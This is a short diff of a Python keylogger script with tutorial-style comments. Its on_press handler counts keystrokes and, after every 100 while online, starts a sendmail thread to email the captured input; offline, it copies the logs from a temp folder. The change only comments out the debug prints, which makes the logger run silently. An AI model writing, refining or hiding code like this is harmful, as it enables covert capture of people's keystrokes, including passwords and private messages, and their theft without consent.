@@ -16,7 +16,7 @@ import socket
 
 #first make an folder in temp
 save = tempfile.mkdtemp("screen")
-print(save) #just printing the path to find out the actual path of temp
+#print(save) #just printing the path to find out the actual path of temp
 cwd = os.getcwd() #it returns current working directory
 source = os.listdir() #gives list of files in current directory
 
@@ -138,7 +138,7 @@ def on_press(key):
         # now write an if else condition to check internet connection and if its true then call the sendmail function.
         if is_connected():
             count += 1 #we are going to increment so so once its reach to 100 its called the sendmail function
-            print('connected {}'.format(count))#just printing to monitor counting
+            #print('connected {}'.format(count))#just printing to monitor counting
             if count > 100:
                 count = 0 # make it  zero again so its start from begining
                 #now call the sendmail function by Thread bcoz it take time and we don't want to miss user keyboard input.
@@ -148,7 +148,7 @@ def on_press(key):
             # else condition exec when internet connection is not working
             countInternet += 1
             # printing the status for monitor
-            print('not connected',countInternet)
+            #print('not connected',countInternet)
             # once internet connection is not working then it will not send file to email
             # now we have to copy file from temp folder to current directory so it is easily accessible instead of looking in temp folder manually
             if countInternet > 10:
